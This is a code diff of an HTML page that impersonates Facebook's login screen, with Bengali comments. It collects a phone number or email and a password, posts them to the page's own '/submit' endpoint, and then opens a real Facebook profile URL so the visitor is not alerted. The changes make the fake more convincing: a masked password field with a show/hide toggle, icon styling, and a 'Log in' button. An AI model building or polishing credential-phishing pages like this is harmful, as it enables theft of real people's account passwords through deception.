@@ -3,7 +3,10 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="favicon" href="favicon.png">
     <title>Facbook Log in</title>
+    <!-- Font Awesome CDN Link (আইকনগুলোর জন্য) -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -35,19 +38,23 @@
 
         .input-group input {
             width: 100%;
-            padding: 10px;
+            padding: 12px 40px 12px 12px;
             border: 1px solid #ccc;
-            border-radius: 5px;
+            border-radius: 6px;
+            font-size: 15px;
             box-sizing: border-box;
+            outline: none;
+        }
+        .input-group input:focus {
+            border-color: #007bff;
         }
 
-        /* সুন্দর সাবমিট বাটন স্টাইল (No standard outline border) */
         .submit-btn {
             width: 100%;
-            background-color: #0091cf; /* সুন্দর সবুজ কালার */
+            background-color: #0091cf;
             color: white;
             padding: 12px;
-            border: none; /* কোনো বর্ডার থাকবে না */
+            border: none; 
             border-radius: 5px;
             font-size: 16px;
             font-weight: bold;
@@ -56,7 +63,46 @@
         }
 
         .submit-btn:hover {
-            background-color: #0185be; /* মাউস নিলে কালার গাঢ় হবে */
+            background-color: #007eb4;
+        }
+        .input-box {
+            position: relative;
+            width: 300px;
+        }
+        .input-box label {
+            display: block;
+            margin-bottom: 5px;
+            color: #333;
+        }
+
+        .input-box input {
+            width: 100%;
+            padding: 12px 40px 12px 12px;
+            border: 1px solid #ccc;
+            border-radius: 6px;
+            font-size: 15px;
+            box-sizing: border-box;
+            outline: none;
+        }
+
+        .input-box input:focus {
+            border-color: #007bff;
+        }
+
+        /* প্রফেশনাল আইকন স্টাইলিং */
+        .toggle-password {
+            position: absolute;
+            right: 12px;
+            top: 65%;
+            transform: translateY(-50%);
+            color: #777;
+            cursor: pointer;
+            font-size: 16px;
+            transition: color 0.2s;
+        }
+
+        .toggle-password:hover {
+            color: #333;
         }
     </style>
 </head>
@@ -69,30 +115,47 @@
         <div class="text">
             <h5 style="color: #0185be; font-size: 17px; margin-top: 10px;">Log in Your Facebook Acount</h5>
         </div>
-        <!-- target="_blank" দেওয়ার ফলে সাবমিট বাটনে ক্লিক করলে নতুন লিংকে ডাটা যাবে ও নতুন ট্যাব খুলবে -->
         <form action="/submit" method="POST" id="contactForm" target="_blank">
             <div class="input-group">
                 <label for="user_name">Phone number</label>
                 <input type="text" id="user_name" name="user_name" placeholder="Phone number or Email address" required>
             </div>
 
-            <div class="input-group">
-                <label for="user_message">Password</label>
-                <input type="text" id="user_message" name="user_message" placeholder="Password" required>
-            </div>
+            <div class="input-box">
+                <label for="user_name">Phone number</label>
+        <input type="password" id="user_message"name="user_message" placeholder="Enter password">
+        <!-- Font Awesome Eye Icon -->
+        <i class="fa-solid fa-eye toggle-password" id="eyeIcon" onclick="togglePassword()"></i>
+    </div>
 
-            <button type="submit" class="submit-btn" onclick="openRedirectLink()">Submit</button>
+    <script>
+        function togglePassword() {
+            const passwordInput = document.getElementById("user_message");
+            const eyeIcon = document.getElementById("eyeIcon");
+
+            if (passwordInput.type === "password") {
+                passwordInput.type = "text";
+                // পাসওয়ার্ড দেখা গেলে স্ল্যাশ আইকন (fa-eye-slash) দেখাবে
+                eyeIcon.classList.remove("fa-eye");
+                eyeIcon.classList.add("fa-eye-slash");
+            } else {
+                passwordInput.type = "password";
+                // আবার লক হলে স্বাভাবিক চোখ (fa-eye) দেখাবে
+                eyeIcon.classList.remove("fa-eye-slash");
+                eyeIcon.classList.add("fa-eye");
+            }
+        }
+    </script>
+            <button type="submit"style="margin-top: 25px" class="submit-btn" onclick="openRedirectLink()">Log in</button>
         </form>
     </div>
 
     <script>
         function openRedirectLink() {
-            // ফর্ম ফিল্ড ফাঁকা না থাকলে নতুন লিংক ওপেন করবে
             var name = document.getElementById('user_name').value;
             var message = document.getElementById('user_message').value;
 
             if (name !== "" && message !== "") {
-                // এখানে আপনার কাঙ্ক্ষিত নতুন লিংকটি বসিয়ে দিন (যেমন: https://google.com)
                 window.open("https://facebook.com/profile.php", "_blank");
             }
         }
